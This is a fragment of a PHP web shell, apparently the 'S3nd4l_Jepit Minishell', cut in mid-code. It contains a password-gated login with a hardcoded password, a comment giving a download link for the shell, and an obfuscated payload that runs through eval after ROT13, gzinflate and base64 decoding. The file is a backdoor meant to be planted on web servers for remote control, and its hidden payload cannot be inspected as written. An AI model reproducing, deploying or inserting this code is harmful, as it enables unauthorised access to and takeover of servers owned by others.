<?php
} else {
    // Jika belum login, tampilkan form login
    if (isset($_POST['password'])) {
        // Password yang benar
        $password = '290802as'; // Ganti dengan password yang diinginkan

        if ($_POST['password'] == $password) {
            $_SESSION['loggedin'] = true;
            echo '<script type="text/javascript">
            window.location = "' . $_SERVER['PHP_SELF'] . '"
            </script>';
        } else {
            echo 'Password salah!';
        }
    }
    ?>
// S3nd4l_Jepit Minishell
// Jangan ngerecode kalo cuman ganti nama gua doang, tanpa ngembangin fitur didalamnya!
// Download : https://gitlab.com/s3nd4l_jepit/s3nd4l_jepit-minishell/-/raw/master/s3nd4l.php
eval(str_rot13(gzinflate(str_rot13(base64_decode("\123\x49\65\117\x43\64\111\167\107\111\142\x2f\x79\x67\67\103\x48\x4b\147\172\x36\164\123\x6f\x59\x37\x48\60\x46\107\66\130\117\157\x6d\x4b\x2b\x79\160\x75\x32\x55\x6f\165\65\161\x2f\x50\x69\147\x34\144\130\x32\165\x66\x35\63\x30\71\107\x63\165\x59\114\x46\x56\x71\144\61\170\x75\127\x41\x73\53\x37\121\x46\63\x50\145\x66\70\x62\x73\107\x5a\145\x4e\x52\111\101\x39\x66\124\x38\x6a\x5a\x6d\170\122\116\x34\x43\63\70\150\110\106\116\124\71\x2b\x67\x63\104\x32\170\167\114\x6e\x77\167\107\162\x44\x68\141\x75\x74\x44\132\153\x41\116\105\142\x52\x41\155\146\152\x34\x4e\x55\x39\111\x67\53\53\71\x4e\x77\117\x79\171\71\x52\105\162\164\116\120\65\130\141\155\153\153\x64\66\x6b\70\x30\53\x53\x67\107\x5a\115\117\110\x4a\x77\53\70\x54\164\164\150\x39\x43\123\142\167\x65\132\170\103\123\154\147\141\152\121\125\155\130\x67\x3d\x3d")))));
?>